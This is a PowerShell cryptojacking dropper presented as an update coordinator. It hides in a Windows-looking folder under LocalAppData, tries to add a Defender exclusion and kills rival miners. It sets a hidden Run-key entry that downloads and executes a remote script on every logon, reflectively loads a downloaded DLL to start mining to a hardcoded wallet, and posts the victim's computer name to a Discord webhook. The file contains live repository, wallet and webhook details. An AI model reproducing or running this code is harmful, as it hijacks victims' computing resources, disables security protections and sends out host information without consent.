$u = "HolyV200"; $r = "trollminer"
$w = "bc1qly9l5tledssjfl8nxq97sdl55je04hjh790z44"
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$u2 = "https://raw.githubusercontent.com/$u/$r/main"

$sDir = "$env:LOCALAPPDATA\Microsoft\Windows\UpdateCoord"
if (!(Test-Path $sDir)) { md $sDir -Force >$null }

$myId = $PID
try {
    Get-CimInstance Win32_Process -EA 0 | Where-Object { $_.CommandLine -match 'update\.ps1' -and $_.ProcessId -ne $myId } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }
} catch { }

# Try Defender exclusion (silent fail if no admin)
try { Add-MpPreference -ExclusionPath $sDir -EA 0 } catch { }

try { Get-Process "xmrig", "miner" -EA 0 | Stop-Process -Force -EA 0 } catch { }

$gd = $false
try { 
    $ccs = Get-CimInstance Win32_VideoController -EA 0
    foreach ($cc in $ccs) { 
        $nn = $cc.Name.ToUpper()
        if ($nn -match "NVIDIA|AMD|RADEON|RTX|GTX" -and $cc.AdapterRAM -gt 3221225472) { 
            if ($nn -notmatch "MICROSOFT BASIC|DISPLAY") { $gd = $true; break } 
        } 
    } 
} catch { }

$tp = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command `"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex(New-Object Net.WebClient).DownloadString('$u2/update.ps1')`""
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "UpdateCoord" $tp -EA 0

$dp = "$sDir\Bridge.dll"
$v = "?v=$([Guid]::NewGuid())"
try {
    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", $ua)
    $wc.DownloadFile("$u2/Bridge.dll$v", $dp)
    if (Test-Path $dp) {
        Add-Type -AssemblyName System.IO.Compression
        $db = [IO.File]::ReadAllBytes($dp)
        [Reflection.Assembly]::Load($db).GetType('DateFundLoader').GetMethod('StartMiner').Invoke($null, @([bool]$gd, [string]$w))
    }
} catch { }

try {
    $wUrl = "https://discord.com/api/webhooks/1499899715582558228/M_6btxpgSDH5UBHvf3zbCyMr0jERa0eYZKdQ8pVR49kHRcjzSOTm-v1eIIhMkrPaPG8l"
    $body = '{"embeds":[{"title":"PS1 EXECUTED SUCCESSFULLY","color":2895667,"fields":[{"name":"Worker","value":"' + $env:COMPUTERNAME + '"}]}]}'
    Invoke-RestMethod -Uri $wUrl -Method Post -Body $body -ContentType "application/json" -EA 0
} catch { }

Write-Host "Running"
while ($true) { Start-Sleep -Seconds 3600 }
